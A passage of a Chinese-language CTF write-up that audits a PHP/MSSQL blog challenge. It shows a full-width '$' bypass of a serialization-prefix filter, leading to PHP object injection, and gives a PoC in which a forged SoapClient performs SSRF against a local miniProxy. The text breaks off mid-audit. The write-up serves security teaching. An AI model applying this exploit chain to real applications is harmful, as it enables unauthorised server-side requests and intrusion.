<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:default.php </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"title"</span>])) &#123;</span><br><span class="line">        $attachments = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"attach"</span>]) &amp;&amp; is_array($_FILES[<span class="string">"attach"</span>])) &#123;</span><br><span class="line">            </span><br><span class="line">            $folder = sha1(random_bytes(<span class="number">10</span>));</span><br><span class="line">            mkdir(<span class="string">"../uploads/$folder"</span>);</span><br><span class="line">            <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($_FILES[<span class="string">"attach"</span>][<span class="string">"tmp_name"</span>]); $i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($_FILES[<span class="string">"attach"</span>][<span class="string">"error"</span>][$i] !== <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">                $name = basename($_FILES[<span class="string">"attach"</span>][<span class="string">"name"</span>][$i]);</span><br><span class="line">                move_uploaded_file($_FILES[<span class="string">"attach"</span>][<span class="string">"tmp_name"</span>][$i], <span class="string">"../uploads/$folder/$name"</span>);</span><br><span class="line">                $attachments[] = <span class="keyword">new</span> Attachment(<span class="string">"/uploads/$folder/$name"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $post = <span class="keyword">new</span> Post($_POST[<span class="string">"title"</span>], $_POST[<span class="string">"content"</span>], $attachments);</span><br><span class="line">        $post-&gt;save();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>2.显示post的功能</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:default.php </span></span><br><span class="line"></span><br><span class="line">    $posts = Post::loadall();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($posts)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;You do not have any posts. Create &lt;a href=\"/?action=create\"&gt;some&lt;/a&gt;!&lt;/b&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;You have "</span> . count($posts) .<span class="string">" posts. Create &lt;a href=\"/?action=create\"&gt;some&lt;/a&gt; more if you want! Or &lt;a href=\"/?action=restart\"&gt;restart your blog&lt;/a&gt;.&lt;/b&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($posts <span class="keyword">as</span> $p) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>与这个功能相关两个类，<code>Post</code>和<code>Attachment</code>类的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#filename:post.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Attachment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $url = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $za = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $mime = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mime = (<span class="keyword">new</span> finfo)-&gt;file(<span class="string">"../"</span>.$url);</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="keyword">$this</span>-&gt;mime, <span class="number">0</span>, <span class="number">11</span>) == <span class="string">"Zip archive"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mime = <span class="string">"Zip archive"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;za = <span class="keyword">new</span> ZipArchive;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $str = <span class="string">"&lt;a href='&#123;$this-&gt;url&#125;'&gt;"</span>.basename(<span class="keyword">$this</span>-&gt;url).<span class="string">"&lt;/a&gt; ($this-&gt;mime "</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_null(<span class="keyword">$this</span>-&gt;za)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;za-&gt;open(<span class="string">"../"</span>.<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">            $str .= <span class="string">"with "</span>.<span class="keyword">$this</span>-&gt;za-&gt;numFiles . <span class="string">" Files."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str. <span class="string">")"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $title = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $content = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $attachment = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $ref = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $id = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($title, $content, $attachments=<span class="string">""</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title = $title;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = $content;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;attachment = $attachments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;id)) &#123;</span><br><span class="line">            DB::insert(<span class="string">"INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)"</span>, </span><br><span class="line">                <span class="keyword">array</span>($USER-&gt;uid, <span class="keyword">$this</span>-&gt;title, <span class="keyword">$this</span>-&gt;content, <span class="keyword">$this</span>-&gt;attachment));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DB::query(<span class="string">"UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?"</span>,</span><br><span class="line">                <span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;title, <span class="keyword">$this</span>-&gt;content, <span class="keyword">$this</span>-&gt;attachment, $USER-&gt;uid, <span class="keyword">$this</span>-&gt;id));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">truncate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        DB::query(<span class="string">"DELETE FROM posts WHERE userid = ?"</span>, <span class="keyword">array</span>($USER-&gt;uid));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        $res = DB::query(<span class="string">"SELECT * FROM posts WHERE userid = ? AND id = ?"</span>,</span><br><span class="line">            <span class="keyword">array</span>($USER-&gt;uid, $id));</span><br><span class="line">        <span class="keyword">if</span> (!$res) <span class="keyword">die</span>(<span class="string">"db error"</span>);</span><br><span class="line">        $res = $res[<span class="number">0</span>];</span><br><span class="line">        $post = <span class="keyword">new</span> Post($res[<span class="string">"title"</span>], $res[<span class="string">"content"</span>], $res[<span class="string">"attachment"</span>]);</span><br><span class="line">        $post-&gt;id = $id;</span><br><span class="line">        <span class="keyword">return</span> $post;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadall</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line">        $posts = DB::query(<span class="string">"SELECT id FROM posts WHERE userid = ? ORDER BY id DESC"</span>, <span class="keyword">array</span>($USER-&gt;uid)) ;</span><br><span class="line">        <span class="keyword">if</span> (!$posts) <span class="keyword">return</span> $result;</span><br><span class="line">        <span class="keyword">foreach</span> ($posts <span class="keyword">as</span> $p) &#123;</span><br><span class="line">            $result[] = Post::load($p[<span class="string">"id"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $str = <span class="string">"&lt;h2&gt;&#123;$this-&gt;title&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">        $str .= <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        $str .= <span class="string">"&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;"</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;attachment <span class="keyword">as</span> $attach) &#123;</span><br><span class="line">            $str .= <span class="string">"&lt;li&gt;$attach&lt;/li&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $str .= <span class="string">"&lt;/il&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x2-1-数据存入数据库的过程"><a href="#0x2-1-数据存入数据库的过程" class="headerlink" title="0x2.1 数据存入数据库的过程"></a>0x2.1 数据存入数据库的过程</h4><p>着重看一下Post类的save操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:post.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $USER;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;id)) &#123;</span><br><span class="line">        DB::insert(<span class="string">"INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)"</span>, </span><br><span class="line">            <span class="keyword">array</span>($USER-&gt;uid, <span class="keyword">$this</span>-&gt;title, <span class="keyword">$this</span>-&gt;content, <span class="keyword">$this</span>-&gt;attachment));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DB::query(<span class="string">"UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?"</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;title, <span class="keyword">$this</span>-&gt;content, <span class="keyword">$this</span>-&gt;attachment, $USER-&gt;uid, <span class="keyword">$this</span>-&gt;id));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是 <code>$this-&gt;attachment</code> 是一个包含<code>Attachment</code>类实例的数组，这个类数组在写数据库的时候是怎么处理的？<br>继续跟踪DB类的insert和query操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:db.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql, $values=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($values)) $values = <span class="keyword">array</span>($values);</span><br><span class="line">        <span class="keyword">if</span> (!DB::$init) DB::initialize();</span><br><span class="line">        $res = sqlsrv_query(DB::$con, $sql, $values);</span><br><span class="line">        <span class="keyword">if</span> ($res === <span class="keyword">false</span>) DB::error();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> DB::retrieve_values($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($sql, $values=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($values)) $values = <span class="keyword">array</span>($values);</span><br><span class="line">        <span class="keyword">if</span> (!DB::$init) DB::initialize();</span><br><span class="line"></span><br><span class="line">        $values = DB::prepare_params($values);</span><br><span class="line"></span><br><span class="line">        $x = sqlsrv_query(DB::$con, $sql, $values);</span><br><span class="line">        <span class="keyword">if</span> (!$x) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>看到 <code>insert</code> 函数里调用了 <code>prepare_params</code>,看一下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:db.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_params</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_map(<span class="function"><span class="keyword">function</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($x) <span class="keyword">or</span> is_array($x)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'$serializedobject$'</span> . serialize($x);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^\$serializedobject\$/i'</span>, $x)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"invalid data"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $x;</span><br><span class="line">    &#125;, $params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到这里就明白了，插入数据库之前，对object数据或者array数据进行了一次序列化，并在前面加上了字符串<code>$serializedobject$</code>作为标志。</p>
<p>但是DB类的<code>query</code>函数中并没有调用<code>prepare_params</code>函数，所以我曾一度认为漏洞点在这里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename: post.php</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DB::query(<span class="string">"UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?"</span>,</span><br><span class="line">        <span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;title, <span class="keyword">$this</span>-&gt;content, <span class="keyword">$this</span>-&gt;attachment, $USER-&gt;uid, <span class="keyword">$this</span>-&gt;id));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在看来难道是出题人这里写错了，不过好像永远不会执行到这里？</p>
<h4 id="0x2-2-数据读出数据库的过程"><a href="#0x2-2-数据读出数据库的过程" class="headerlink" title="0x2.2 数据读出数据库的过程"></a>0x2.2 数据读出数据库的过程</h4><p>看第2个功能，显示post的功能，<code>Post</code>的<code>loadall</code>函数:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:post.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        $res = DB::query(<span class="string">"SELECT * FROM posts WHERE userid = ? AND id = ?"</span>,</span><br><span class="line">            <span class="keyword">array</span>($USER-&gt;uid, $id));</span><br><span class="line">        <span class="keyword">if</span> (!$res) <span class="keyword">die</span>(<span class="string">"db error"</span>);</span><br><span class="line">        $res = $res[<span class="number">0</span>];</span><br><span class="line">        $post = <span class="keyword">new</span> Post($res[<span class="string">"title"</span>], $res[<span class="string">"content"</span>], $res[<span class="string">"attachment"</span>]);</span><br><span class="line">        $post-&gt;id = $id;</span><br><span class="line">        <span class="keyword">return</span> $post;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loadall</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $USER;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line">        $posts = DB::query(<span class="string">"SELECT id FROM posts WHERE userid = ? ORDER BY id DESC"</span>, <span class="keyword">array</span>($USER-&gt;uid)) ;</span><br><span class="line">        <span class="keyword">if</span> (!$posts) <span class="keyword">return</span> $result;</span><br><span class="line">        <span class="keyword">foreach</span> ($posts <span class="keyword">as</span> $p) &#123;</span><br><span class="line">            $result[] = Post::load($p[<span class="string">"id"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>load</code>函数调用了<code>DB::query</code>函数，<code>DB::query</code>函数会调用<code>retrieve_values</code>进行反序列化:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:db.php </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">retrieve_values</span><span class="params">($res)</span> </span>&#123;</span><br><span class="line">    $result = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">while</span> ($row = sqlsrv_fetch_array($res)) &#123;</span><br><span class="line">        $result[] = array_map(<span class="function"><span class="keyword">function</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> preg_match(<span class="string">'/^\$serializedobject\$/i'</span>, $x) ?</span><br><span class="line">                unserialize(substr($x, <span class="number">18</span>)) : $x;</span><br><span class="line">        &#125;, $row);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里把从数据库中取出的<strong>所有字段</strong>中查找<code>$serializedobject$</code>标志，如果找到了就把标志后面的部分进行反序列化。这里关键词是<code>所有字段</code>,如果我们可以伪造以<code>$serializedobject$</code>开头的字符串，存入数据库中，就可以造成任意类伪造了。</p>
<p>但是在数据存入数据库之前会检查数据中是否有<code>$serializedobject$</code>,如果有就不允许写入数据库:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:db.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_params</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_map(<span class="function"><span class="keyword">function</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_object($x) <span class="keyword">or</span> is_array($x)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'$serializedobject$'</span> . serialize($x);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^\$serializedobject\$/i'</span>, $x)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"invalid data"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $x;</span><br><span class="line">    &#125;, $params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了官方的WP，才知道这里有个小trick:</p>
<blockquote>
<p>Luckily, MSSQL automatically converts full-width unicode characters to their ASCII representation. For example, if a string contains <code>0xEF 0xBC 0x84</code>, it will be stored as <code>$</code>.</p>
</blockquote>
<p>这里说的<code>0xEF 0xBC 0x84</code>其实说的UTF-8编码,对应的二进制是<code>1110 1111 1011 1100 1000 0100</code>,根据unicode和utf8的转换规则，这里表示的unicode字符应该是<code>1111 1111 0000 0100</code>,即<code>0xFF04</code>,查一下unicode表，表示的字符是<code>＄</code>,是<code>$</code>的全角字符。</p>
<p>mssql会把这种全角字符转化为对应的ascii码，所以<code>0xFF21~0xFF5A</code>这个范围内的字符都是可以被转换的，可以利用这个trick绕过这个检查。</p>
<p>其实这种数据库关于字符的trick，在mysql中也不少，例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username=<span class="string">'admin%2c'</span>; </span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username=<span class="string">'Àdmin'</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这两个sql语句都可能查出admin的记录，但是原理不一样，可以自己去看p师傅的博客或者小密圈。</span></span><br><span class="line">𝍠 𝍡  𝍣 𝍥  <span class="comment">-- 这几个字符会引起截断</span></span><br></pre></td></tr></table></figure>

<p>所以插入post的时候，在content字段伪造<code>$serializedobject＄序列化的数据</code>,在显示post的时候就会成功的反序列化出任意类。</p>
<h3 id="0x3-反序列化触发SSRF"><a href="#0x3-反序列化触发SSRF" class="headerlink" title="0x3 反序列化触发SSRF"></a>0x3 反序列化触发SSRF</h3><p>可以进行任意类伪造了，但是伪造什么类呢，根据<code>/miniProxy</code>目录里面的代码，很容易想到需要伪造SoapClient,进行SSRP的，接下来就是找怎么触发SoapClient来发请求了。</p>
<p>看展示post的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:default.php</span></span><br><span class="line"><span class="keyword">foreach</span>($posts <span class="keyword">as</span> $p) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $p;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>$p</code>是<code>Post</code>类的示例，所以会调用<code>Post</code>类的<code>__toString</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:post.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $str = <span class="string">"&lt;h2&gt;&#123;$this-&gt;title&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">    $str .= <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">    $str .= <span class="string">"&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;attachment <span class="keyword">as</span> $attach) &#123;</span><br><span class="line">        $str .= <span class="string">"&lt;li&gt;$attach&lt;/li&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $str .= <span class="string">"&lt;/il&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里展示<code>$this-&gt;attachment</code>的时候，又会调用<code>Attachment</code>的<code>__toString</code>函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:post.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $str = <span class="string">"&lt;a href='&#123;$this-&gt;url&#125;'&gt;"</span>.basename(<span class="keyword">$this</span>-&gt;url).<span class="string">"&lt;/a&gt; ($this-&gt;mime "</span>;</span><br><span class="line">    <span class="keyword">if</span> (!is_null(<span class="keyword">$this</span>-&gt;za)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;za-&gt;open(<span class="string">"../"</span>.<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        $str .= <span class="string">"with "</span>.<span class="keyword">$this</span>-&gt;za-&gt;numFiles . <span class="string">" Files."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str. <span class="string">")"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意这里的<code>$this-&gt;za-&gt;open()</code>操作，如果我们伪造<code>$this-&gt;za</code>为<code>SoapClient</code>类的实例，在这里调用<code>open</code>函数的时候，就会触发<code>SoapClient</code>的<code>__call</code>函数，发送一次请求。</p>
<p>所以利用思路是，伪造<code>content</code>为<code>Attachment</code>实例，其中的<code>$this-&gt;za</code>是一个<code>SoapClient</code>实例,那么在展示<code>content</code>的时候就会触发<code>Attachment</code>的<code>__toString</code>操作，从而触发<code>SoapClient</code>的<code>__call</code>函数。</p>
<p>poc如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Attachment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $url = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $za = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> $mime = <span class="keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = <span class="string">"test"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mime = <span class="string">"test"</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;za = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1:9999"</span>,</span><br><span class="line">            <span class="string">'uri'</span>=&gt; <span class="string">"http://test-uri/"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$attachment = <span class="keyword">new</span> Attachment();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$serializedobject＄'</span>.serialize($attachment);</span><br></pre></td></tr></table></figure>

<p><img src="http://pic.wonderkun.cc/uploads/2019/01/2019-01-10-14-36-20.png" alt="http://pic.wonderkun.cc/uploads/2019/01/2019-01-10-14-36-20.png"></p>
<p>看到发送的请求，如下:</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/01/2019-01-10-14-36-57.png" alt="http://pic.wonderkun.cc/uploads/2019/01/2019-01-10-14-36-57.png"></p>
<h3 id="0x4-利用miniProxy"><a href="#0x4-利用miniProxy" class="headerlink" title="0x4 利用miniProxy"></a>0x4 利用miniProxy</h3><p>看miniProxy的nginx配置文件:</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">127.0.0.1:8080</span>;</span><br><span class="line">    <span class="attribute">access_log</span> /var/log/nginx/proxy.log;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">if</span> ( <span class="variable">$request_method</span> !<span class="regexp">~ ^(GET)$</span> ) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">405</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">root</span> /var/www/miniProxy;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">index</span> index.php;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">            <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line">            <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>miniProxy只接受GET请求，但是Soapclient发送的请求，默认是POST的，这个其实很好绕过，在这篇文章<a href="http://wonderkun.cc/index.html/?p=691" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=691</a>中我就讲过这个利用SoapClient类的CRLF漏洞,发起长连接的技巧,这里刚好用上了。</p>
<p>下面主要看一下怎么利用miniProxy了,审计一下miniProxy的代码</p>
<p>看下面这一段:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"miniProxyFormAction"</span>])) &#123;</span><br><span class="line">  $url = $_POST[<span class="string">"miniProxyFormAction"</span>];</span><br><span class="line">  <span class="keyword">unset</span>($_POST[<span class="string">"miniProxyFormAction"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $queryParams = <span class="keyword">Array</span>();</span><br><span class="line">  parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>], $queryParams);</span><br><span class="line">  <span class="comment">//If the miniProxyFormAction field appears in the query string, make $url start with its value, and rebuild the the query string without it.</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($queryParams[<span class="string">"miniProxyFormAction"</span>])) &#123;</span><br><span class="line">    $formAction = $queryParams[<span 